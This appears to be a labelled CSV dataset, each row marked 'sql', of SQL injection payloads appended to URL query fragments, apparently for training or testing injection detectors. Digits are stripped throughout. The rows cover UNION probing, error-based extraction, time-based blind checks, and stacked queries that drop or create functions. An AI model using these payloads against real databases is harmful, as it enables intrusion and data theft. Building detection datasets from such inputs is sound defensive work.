2380,sql,". . . . / ? = & =   ' ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( ' MzaZ ' = ' "
2381,sql,". . . . / / / ? = & =   ) ) AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ( ( = "
2382,sql,". . . . / / / ? = & =   % "" RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UfpP ) AND " % " = " "
2383,sql,". . . / ? =  - % ' ) ) UNION ALL SELECT , , , , , , , , # "
2384,sql,". . . ? =   ' ) ) ; SELECT SLEEP ( ) AND ( ( ' IBiJ ' LIKE ' "
2385,sql,". . . . / ? = & =    UNION ALL SELECT NULL -- "
2386,sql,". . . . / ? =   ' ) ) ) ; SELECT PG_SLEEP ( )  --"
2387,sql,". . . . / ? = & = & =   % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2388,sql,". . . / / / / ? = & =   % ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND ' % ' = ' "
2389,sql,". . . / / ? =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2390,sql,". . . / ? =   % ' ) AND =  -- "
2391,sql,". . ? = & = & = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2392,sql,". . / / ? = & =   ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) "
2393,sql,". . / / ? =  - ) ) ) UNION ALL SELECT # "
2394,sql,". . . / / / / ? = & = & = & =   ' ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ' WGym ' = ' "
2395,sql,". . . / ? = & = & =    RLIKE ( SELECT ( CASE WHEN ( = ) THEN xcdfeecaffcdef ELSE x END ) )  -- "
2396,sql,". . . / / ? = & = & = & =   ' UNION ALL SELECT NULL # "
2397,sql,". . . / / / ? =   % ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ' % ' = ' "
2398,sql,". . . . / / / / ? = & = & = & =  - UNION ALL SELECT # "
2399,sql,". . / / / ? = & =  - ) UNION ALL SELECT , , , # "
2400,sql,". . . . / / / / ? = & = & = & =   ) ) ) ; SELECT PG_SLEEP ( )  --"
2401,sql,". . . . ? =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL # "
2402,sql,". . ? = & =   % ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2403,sql,". . . / / ? = & = & =   UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2404,sql,". . / / ? = & = & =   ) ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( ( = "
2405,sql,". . / / ? = & = & =   % ' AND = AND ' % ' = ' "
2406,sql,". . . / / ? = & =  - "" ) UNION ALL SELECT , , , , , , # "
2407,sql,". . . . / / / / ? = & =   ) ) ) AND = ( SELECT  FROM PG_SLEEP ( ) ) AND ( ( ( = "
2408,sql,". . ? = & = & =  - "" UNION ALL SELECT , , , , # "
2409,sql,". . / / / ? = & = & = & =  - ' ) ) UNION ALL SELECT , , , , , , , ,  -- "
2410,sql,". . / / / ? = & = & =   "" ) AND MAKE_SET ( = , ) AND ( " onIU " LIKE " "
2411,sql,". . . . / / / / ? = & = & = & =  - "" ) UNION ALL SELECT , , , , , , , # "
2412,sql,". . / / ? = & =   % "" AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL AND " % " = " "
2413,sql,". . / ? = & = & =   , ( BEGIN IF ( = ) THEN DBMS_LOCK . SLEEP ( ) ; ELSE DBMS_LOCK . SLEEP ( ) ; END IF ; END ; ) "
2414,sql,". . . . / ? = & = & = & =   % ' ) AND = % "
2415,sql,". . . ? = & = & = & =  - ' ) UNION ALL SELECT , , , , , , , , ,  -- "
2416,sql,". . . / ? = & = & = & =   % "" UNION ALL SELECT NULL , NULL -- "
2417,sql,". . . / ? = & = & = & =   ' ) ) ) ; SELECT SLEEP ( ) # "
2418,sql,". . / / ? =   ' ) ; SELECT SLEEP ( ) AND ( ' fxQl ' LIKE ' "
2419,sql,". . / / ? =   % "" ; SELECT DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) FROM DUAL --"
2420,sql,". . . . / / ? = & =   ' ) ORDER BY # "
2421,sql,". . / ? = & =   "" ) ) AND =  -- "
2422,sql,". . . . ? =  - "" ) UNION ALL SELECT , , , , , , , , ,  -- "
2423,sql,". . ? = & = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2424,sql,". . / ? =  - ' UNION ALL SELECT ,  -- "
2425,sql,". . / / / / ? = & = & =   % ' ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ' % ' = ' "
2426,sql,". . . / / / / ? =   ' ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ' AnDX ' LIKE ' "
2427,sql,". . . . / / ? = & = & = & =   "" PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND " UOhd " = " "
2428,sql,". . . ? = & = & =   % ' AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ' % ' = ' "
2429,sql,". . . . / / / / ? = & =   ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2430,sql,". . . / ? = & =   ) ) AND = AND ( ( = "
2431,sql,". . . . / / ? = & = & =   , ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
2432,sql,". . . . / ? = & =  - UNION ALL SELECT # "
2433,sql,". . . / ? = & = & =   ' AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' bOzV ' LIKE ' "
2434,sql,". . . / ? = & = & =   AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
2435,sql,". . . . / ? = & = & =   "" UNION ALL SELECT NULL , NULL # "
2436,sql,". . / / / / ? =  - ' ) UNION ALL SELECT , , ,  -- "
2437,sql,". . . . / ? = & =  - "" ) ORDER BY  -- "
2438,sql,". . . ? = & = & =   ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC )  -- "
2439,sql,". . ? = & = & = & =   "" PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND " UOhd " = " "
2440,sql,". . / / / ? = & =   ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM DUAL UNION SELECT  FROM DUAL ) END ) "
2441,sql,". . . / / / ? =   ' ) ) RLIKE SLEEP ( ) AND ( ( ' iZcy ' = ' "
2442,sql,". . . ? = & =   "" ) PROCEDURE ANALYSE ( EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) , xba ) ) , ) AND ( " yYgZ " = " "
2443,sql,". . . . ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2444,sql,". . . / / / ? = & = & = & =   ' ) ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ( ' DYZE ' LIKE ' "
2445,sql,". . . . / / / / ? = & = & = & =   % ' ) ) RLIKE SLEEP ( ) AND ( ( ' % ' = ' "
2446,sql,". . . / / / / ? = & = & =   ' ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ' PGqC ' = ' "
2447,sql,". . / / ? = & = & =  - "" ) ) UNION ALL SELECT , , , , , # "
2448,sql,". . / / ? = & = & = & =  - ' ) ORDER BY # "
2449,sql,". . / / ? = & = & =   % ' ) ) ORDER BY # "
2450,sql,". . . . ? = & = & = & =   % "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " % " = " "
2451,sql,". . . / ? = & =   AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) # "
2452,sql,". . / / / / ? = & = & = & =   ( SELECT ( CASE WHEN ( = ) THEN DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) ELSE  END ) FROM DUAL ) "
2453,sql,". . . . / / / ? = & = & =   ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2454,sql,". . . / ? = & =  - UNION ALL SELECT # "
2455,sql,". . . / / / / ? = & = & =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL # "
2456,sql,". . . . / / / / ? = & = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2457,sql,". . / / ? = & =   ' AND = # "
2458,sql,". . / / / ? =   , ( SELECT  FROM ( SELECT ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) ) s ) "
2459,sql,". . . / / / / ? =   ' WAITFOR DELAY ' : : '  -- "
2460,sql,". . . . / / / / ? = & =   ) AND = % "
2461,sql,". . . / / / / ? = & =  - "" ) UNION ALL SELECT , , , # "
2462,sql,". . . ? = & =  - ' ) UNION ALL SELECT , , , , , , , , ,  -- "
2463,sql,". . / / / / ? = & =   % ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL # "
2464,sql,". . . . / / / ? = & = & =   % ' AND = # "
2465,sql,". . . . / / ? = & = & =   ' AND = % "
2466,sql,". . / ? =   % ' ) ) ; SELECT PG_SLEEP ( )  --"
2467,sql,". . . . / / / / ? =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
2468,sql,". . / / / / ? = & = & =   ' ) ) ) AND = # "
2469,sql,". . . / / / ? = & =  - % ' ) UNION ALL SELECT , , , , ,  -- "
2470,sql,". . . / / ? = & = & = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS "
2471,sql,". . ? = & = & = & =  - ) UNION ALL SELECT , , , , , , , , , # "
2472,sql,". . ? = & = & =  - % ' ) ) UNION ALL SELECT , , , # "
2473,sql,". . . . ? = & = & =   ' UNION ALL SELECT NULL -- "
2474,sql,". . . / / / / ? = & =   ' AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CTXSYS . DRITHSX . SN ( , ) END ) FROM DUAL ) IS NULL -- "
2475,sql,". . . . / / / ? = & = & = & =  YLOAD] ) ) AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND ( ( = "
2476,sql,". . . . / ? = & =   ) ) ) ; IF ( = ) SELECT  ELSE DROP FUNCTION jlQo --"
2477,sql,". . . / / ? = & =    AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) )  -- "
2478,sql,". . / / / ? = & = & = & =  - ) ) ) UNION ALL SELECT , , , , , , , , , # "
2479,sql,". . / / / / ? =   % ' ) UNION ALL SELECT NULL -- "
2480,sql,". . . ? = & = & =  - ' UNION ALL SELECT  -- "
2481,sql,". . . / / / / ? =  - ) UNION ALL SELECT , , , , ,  -- "
2482,sql,". . / / / ? = & =   "" ) ) AND MAKE_SET ( = , ) AND ( ( " QarM " = " "
2483,sql,". . . / ? = & =   ' UNION ALL SELECT NULL , NULL , NULL , NULL , NULL -- "
2484,sql,". . . / ? = & =   ) ) AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND ( ( = "
2485,sql,". . . / / ? = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2486,sql,". . . . ? = & = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE * ( SELECT  FROM INFORMATION_SCHEMA . PLUGINS ) END ) ) "
2487,sql,". . / ? = & = & = & =   AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) )  -- "
2488,sql,". . . / ? = & = & = & =   ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ( ' zBYL ' LIKE ' "
2489,sql,". . / / / / ? = & = & = & =   "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2490,sql,". . . . ? =   ' AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ' Ayfs ' = ' "
2491,sql,". . . ? =   ' ) AND EXTRACTVALUE ( , CONCAT ( xc , x , ( SELECT ( ELT ( = , ) ) ) , xba ) ) AND ( ' Aokv ' = ' "
2492,sql,". . . ? =   ) AND SLEEP ( ) # "
2493,sql,". . / / / / ? = & = & = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' pqNJ ' = ' "
2494,sql,". . ? =   % "" AND = CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) ) : : text | | ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) AND " % " = " "
2495,sql,". . . / / ? =   % ' UNION ALL SELECT NULL , NULL , NULL -- "
2496,sql,". . . / / / / ? =   ' ) ) RLIKE ( SELECT ( CASE WHEN ( = ) THEN  ELSE x END ) ) AND ( ( ' msMH ' = ' "
2497,sql,". . . ? = & =   % ' AND = # "
2498,sql,". . / / / ? = & = & = & =   % ' RLIKE ( SELECT ( CASE WHEN ( = ) THEN xaffdedeafffe ELSE x END ) ) AND ' % ' = ' "
2499,sql,". . . / / ? =   ' ) ) AND =  -- "
2500,sql,". . . . ? = & =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
2501,sql,". . . / ? =   ' ) ) UNION ALL SELECT NULL , NULL , NULL , NULL -- "
2502,sql,". . . / ? = & = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL -- "
2503,sql,". . . . / / / / ? = & =   ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , )  -- "
2504,sql,". . . ? = & =   "" ) AND = CTXSYS . DRITHSX . SN ( , ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) AND ( " LvcP " LIKE " "
2505,sql,". . ? =  - "" ) UNION ALL SELECT , , , , ,  -- "
2506,sql,". . . / / / / ? = & =  - % "" UNION ALL SELECT  -- "
2507,sql,". . . ? = & = & = & =   "" AND = CONVERT ( INT , ( SELECT CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND " OXLt " = " "
2508,sql,". . . / / ? =   ' AND ( SELECT  FROM ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM INFORMATION_SCHEMA . PLUGINS GROUP BY x ) a ) AND ' wJwk ' = ' "
2509,sql,". . . . / / / / ? = & = & = & =   % ' ) AND =  -- "
2510,sql,". . . / / ? =   ) ) UNION ALL SELECT NULL , NULL , NULL -- "
2511,sql,". . . / / / ? = & = & = & =   "" ) UNION ALL SELECT NULL , NULL , NULL -- "
2512,sql,". . . . / / / ? = & = & =   ' ) ) WAITFOR DELAY ' : : ' AND ( ( ' iUuD ' = ' "
2513,sql,". . . . / / / ? = & = & = & =  - ' UNION ALL SELECT , , , , , , , , ,  -- "
2514,sql,". . . / / ? = & =   ( SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END ) ) "
2515,sql,". . . / / / / ? =   ) ) AND  IN ( SELECT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) + ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) ) AND ( ( = "
2516,sql,". . / / ? = & = & =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2517,sql,". . / ? =   ' ) AND = AND ( ' dypW ' LIKE ' "
2518,sql,". . / / / ? = & = & =   ' ) ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( ( ' feWA ' LIKE ' "
2519,sql,". . . ? =   ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) eJit ) # "
2520,sql,". . . ? = & =   "" ) RLIKE ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) Irzi ) AND ( " UzzM " LIKE " "
2521,sql,". . . / / / ? = & = & =   ' ) ) ; CREATE OR REPLACE FUNCTION SLEEP ( int ) RETURNS int AS ' / lib / libc . so . ' , ' sleep ' language ' C ' STRICT ; SELECT sleep ( )  --"
2522,sql,". . . . / / / ? = & = & =  - UNION ALL SELECT ,  -- "
2523,sql,". . / / / ? = & =   "" ) UNION ALL SELECT NULL , NULL , NULL # "
2524,sql,". . . / ? =   "" ) ; IF ( = ) SELECT  ELSE DROP FUNCTION fsKk --"
2525,sql,". . . / ? = & = & = & =   ' ) ) AND = # "
2526,sql,". . / ? = & =    ORDER BY  -- "
2527,sql,". . / / / / ? = & = & = & =   ) ) UNION ALL SELECT NULL , NULL , NULL -- "
2528,sql,". . / / ? =   ) AND ( SELECT * FROM ( SELECT ( SLEEP ( ) ) ) UygZ ) AND ( = "
2529,sql,". . . / / / ? = & =   ' ) ) ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( ( ( ' YPKA ' = ' "
2530,sql,". . . / / / / ? = & = & =   ' ) ) UNION ALL SELECT NULL , NULL , NULL # "
2531,sql,". . / / / / ? =  - ) ) ) ORDER BY # "
2532,sql,". . . . / / / ? = & = & = & =  - "" ) UNION ALL SELECT , , , , , , , ,  -- "
2533,sql,". . . ? =   ' ) ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL ) AND ( ( ' ItBH ' LIKE ' "
2534,sql,". . . / / ? =   ' ) ) UNION ALL SELECT NULL , NULL -- "
2535,sql,". . . . / / / / ? = & = & = & =  - % ' ) UNION ALL SELECT , , , , , , , ,  -- "
2536,sql,". . / / / ? = & = & = & =   ) ) ) UNION ALL SELECT NULL , NULL , NULL # "
2537,sql,". . / / / / ? = & =   % "" AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND " % " = " "
2538,sql,". . . . ? =   % ' ) ) AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) AND ( ( ' % ' = ' "
2539,sql,". . / / / / ? = & = & = & =   ' ) ) RLIKE SLEEP ( ) AND ( ( ' iZcy ' = ' "
2540,sql,". . . / ? = & =   % ' ) ) ORDER BY # "
2541,sql,". . / / / / ? =   % ' ) ) AND = AND ( ( ' % ' = ' "
2542,sql,". . . / / / ? = & = & =   "" ) ) AND = DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) AND ( ( " VZyZ " = " "
2543,sql,". . . / / / / ? = & = & = & =   ' , ( SELECT ( CASE WHEN ( = ) THEN DBMS_PIPE . RECEIVE_MESSAGE ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) , ) ELSE / ( SELECT  FROM DUAL ) END ) FROM DUAL )  -- "
2544,sql,". . / / / / ? = & = & = & =    UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL # "
2545,sql,". . . . / / ? =   "" ) ) ; SELECT PG_SLEEP ( )  --"
2546,sql,". . / / / / ? = & = & = & =   ' ) ) ) AND = AND ( ( ( ' hSkj ' = ' "
2547,sql,". . . / / / ? = & =  - UNION ALL SELECT , , ,  -- "
2548,sql,". . / / ? = & = & =   % ' ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
2549,sql,". . . . / / ? = & = & =   "" ) AND UPDATEXML ( , CONCAT ( xe , x , ( SELECT ( ELT ( = , ) ) ) , xba ) , ) AND ( " BUon " = " "
2550,sql,". . ? = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL -- "
2551,sql,". . . / / ? = & = & = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' ygeW ' LIKE ' "
2552,sql,". . / ? =  - "" ) UNION ALL SELECT , , ,  -- "
2553,sql,". . . . / / ? = & =   % ' ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2554,sql,". . . . ? = & = & =  - "" ) UNION ALL SELECT , , , , # "
2555,sql,". . . / / / / ? = & = & = & =    AND = ( ' qpvbq ' | | ( SELECT CASE  WHEN  THEN  ELSE  END FROM RDB$DATABASE ) | | ' qvkjq ' ) # "
2556,sql,". . / ? = & = & =  - % ' ORDER BY  -- "
2557,sql,". . . / ? = & = & =   % "" UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2558,sql,". . . ? = & =   "" ) ) UNION ALL SELECT NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL , NULL -- "
2559,sql,". . . / ? = & = & =   % "" AND = CONCAT ( CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) , ( SELECT ( CASE WHEN ( = ) THEN CHAR ( ) ELSE CHAR ( ) END ) ) , CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) +CHAR ( ) ) AND " % " = " "
2560,sql,". . . . / / ? =   ) RLIKE SLEEP ( ) AND ( = "
2561,sql,". . . / / / ? =  - % ' ) ) UNION ALL SELECT , , , , , , ,  -- "
2562,sql,". . . / / / ? =   "" ) UNION ALL SELECT NULL , NULL , NULL , NULL # "
2563,sql,". . . . ? =    UNION ALL SELECT NULL # "
2564,sql,". . . . / / / / ? =   ) AND = ( SELECT UPPER ( XMLType ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) ) FROM DUAL )  -- "
2565,sql,". . / ? =  - % ' UNION ALL SELECT , , , , , , # "
2566,sql,". . / / / / ? = & = & = & =   AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS "
2567,sql,". . . . / / / / ? = & = & = & =   ' ) ) AND =  -- "
2568,sql,". . . / ? =   "" ) UNION ALL SELECT NULL , NULL -- "
2569,sql,". . . ? = & = & =   ' ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL AND ( ' AoPc ' LIKE ' "
2570,sql,". . . . / / / / ? = & = & = & =   ) ; SELECT SLEEP ( ) # "
2571,sql,". . / / / / ? = & = & =   ) ) ) ; SELECT ( CASE WHEN ( = ) THEN  ELSE / ( SELECT ) END )  --"
2572,sql,". . . . / / / / ? = & =   % "" UNION ALL SELECT NULL -- "
2573,sql,". . . . / / / / ? = & = & =   ) AND ( SELECT ( CASE WHEN ( = ) THEN NULL ELSE CAST ( ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) ) AS NUMERIC ) END ) ) IS NULL -- "
2574,sql,". . / / / / ? =   AND = UTL_INADDR . GET_HOST_ADDRESS ( CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | ( SELECT ( CASE WHEN ( = ) THEN  ELSE  END ) FROM DUAL ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) | | CHR ( ) )  -- "
2575,sql,". . . / / / ? = & =   AND ROW ( , ) > ( SELECT COUNT ( * ) , CONCAT ( x , ( SELECT ( ELT ( = , ) ) ) , xba , FLOOR ( RAND ( ) * ) ) x FROM ( SELECT  UNION SELECT  UNION SELECT  UNION SELECT ) a GROUP BY x ) # "
